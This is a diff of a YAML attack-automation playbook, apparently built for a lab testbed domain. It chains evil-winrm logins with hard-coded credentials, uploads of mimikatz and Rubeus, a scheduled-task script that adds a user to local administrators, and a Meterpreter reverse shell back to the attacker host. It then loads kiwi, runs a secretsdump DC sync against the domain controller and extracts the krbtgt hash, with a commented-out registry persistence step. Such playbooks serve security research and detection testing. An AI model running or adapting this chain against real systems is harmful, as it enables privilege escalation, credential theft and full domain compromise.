@@ -1,66 +1,60 @@
 vars:
-  TARGET: 10.10.10.10
-  ATTACKER: 10.10.10.200
+  TARGET: 192.168.10.123
+  ATTACKER: 192.168.10.142
   USER: Alice
   DOMAIN: aecid-testbed.com
   PASSWORD: Pa$$w0rd
-  PAYLOADS: /home/superuser/payloads
+  PAYLOADS: /home/ubuntu/payloads
   PAYLOAD: "windows/x64/meterpreter/reverse_tcp"
   DOMADM: "wsadmin"
-  DOMADMPW: "Root.PW1"
-  DOMDC: 10.0.0.10
+  DOMADMPW: " Root.PW1 "
+  DOMDC: 192.168.10.228
   DOMHOST: dc1.aecid-testbed.com
 
 commands:
   - type: shell
-    cmd: "evil-winrm -i $TARGET -u $USER -p '$PASSWORD'\n"
-    command_timeout: 30
-    interactive: true
     creates_session: winrm
-    metadata:
-      techniques: "T1590.002,T1591"
-      tactics: "Reconnaissance"
-      technique_name: "Gather Victim Network Information: DNS,Gather Victim Org Information"
+    command_timeout: 30
+    cmd: "/usr/local/bin/evil-winrm -i $TARGET -u $USER@$DOMAIN --no-colors -p '$PASSWORD' -P 5986 -S\n"
+    interactive: True
 
   - type: shell
     session: winrm
-    cmd: "mkdir C:\\\\Temp\n"
+    cmd: "upload $PAYLOADS/mimidrv.sys C:\\Temp\\mimidrv.sys\n"
     interactive: true
 
   - type: shell
     session: winrm
-    cmd: "upload $PAYLOADS/Rubeus.exe C:\\\\Temp\\\\Rubeus.exe\n"
+    cmd: "upload $PAYLOADS/mimilib.dll C:\\Temp\\mimilib.dll\n"
+    read: true
     interactive: true
 
   - type: shell
     session: winrm
-    cmd: "upload $PAYLOADS/mimidrv.sys C:\\\\Temp\\\\mimidrv.sys\n"
+    cmd: "upload $PAYLOADS/mimispool.dll C:\\Temp\\mimispool.dll\n"
+    read: true
     interactive: true
 
   - type: shell
     session: winrm
-    cmd: "upload $PAYLOADS/mimikatz.exe C:\\\\Temp\\\\mimikatz.exe\n"
+    cmd: "upload $PAYLOADS/Rubeus.exe C:\\Temp\\Rubeus.exe\n"
     interactive: true
+    read: true
 
   - type: shell
     session: winrm
-    cmd: "upload $PAYLOADS/mimilib.dll C:\\\\Temp\\\\mimilib.dll\n"
+    cmd: "Set-Content -Path C:\\ProgramData\\WriteLog.ps1 -Value 'net localgroup administrators Alice /add'\n"
     interactive: true
-
-  - type: shell
-    session: winrm
-    cmd: "upload $PAYLOADS/mimispool.dll C:\\\\Temp\\\\mimispool.dll\n"
-    interactive: true
-
-  - type: shell
-    session: winrm
-    cmd: "Set-Content -Path C:\\\\ProgramData\\\\WriteLog.ps1 -Value 'net localgroup administrators Alice /add'\n"
-    interactive: true
+    read: true
 
   - type: shell
     session: winrm
     cmd: "schtasks /run /tn WriteLog\n"
     interactive: true
+    read: true
+
+  - type: mktemp
+    variable: RSHELL
 
   - type: msf-payload
     cmd: $PAYLOAD
@@ -68,12 +62,13 @@ commands:
         LHOST: $ATTACKER
         LPORT: "9001"
     format: exe
-    local_path: $PAYLOADS/msf.exe
+    local_path: $RSHELL
 
   - type: shell
     session: winrm
-    cmd: "upload $PAYLOADS/msf.exe C:\\\\Temp\\\\msf.exe\n"
+    cmd: "upload $RSHELL C:\\Temp\\msf.exe\n"
     interactive: true
+    read: true
 
   - type: msf-module
     creates_session: rshell
@@ -88,17 +83,29 @@ commands:
   - type: shell
     creates_session: winrmPriv
     command_timeout: 30
-    cmd: "evil-winrm -i $TARGET -u $USER -p '$PASSWORD'\n"
-    interactive: true
+    cmd: "/usr/local/bin/evil-winrm -i $TARGET -u $USER@$DOMAIN --no-colors -p '$PASSWORD' -P 5986 -S\n"
+    interactive: True
 
   - type: shell
     session: winrmPriv
-    cmd: "C:\\\\Temp\\\\msf.exe\n"
-    interactive: true
+    cmd: "C:\\Temp\\msf.exe\n"
+    interactive: True
 
   - type: msf-session
     session: rshell
     cmd: getuid
+
+      #   - type: msf-module
+      #     cmd: exploit/windows/local/registry_persistence
+      #     payload: "windows/meterpreter/reverse_tcp"
+      #     payload_options:
+      #       LHOST: $ATTACKER
+      #       LPORT: "4444"
+      #     options:
+      #       SESSION: $LAST_MSF_SESSION
+      #       VERBOSE: "true"
+      #       RUN_NAME: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\HOTIWASHERE"
+      #       STARTUP: USER
 
   - type: msf-session
     session: rshell
@@ -112,12 +119,12 @@ commands:
     session: rshell
     cmd: load kiwi
 
-  - type: sleep
-    seconds: 5
+#  - type: sleep
+#    seconds: 5
 
-  # - type: msf-session
-  #   session: rshell
-  #   cmd: "cd C:\\\\Temp\n"
+  - type: msf-session
+    session: rshell
+    cmd: cd C:\\Temp
 
   - type: msf-session
     session: rshell
@@ -147,7 +154,7 @@ commands:
     cmd: "$NTLM"
 
   - type: shell
-    cmd: "secretsdump.py $DOMAIN/'$DOMADM':'$DOMADMPW'@'$DOMDC' -just-dc"
+    cmd: "secretsdump.py $DOMAIN/'$DOMADM':'$DOMADMPW'@'$DOMDC' -just-dc\n"
 
   - type: regex
     cmd: "krbtgt:aes256.*:(.*)"
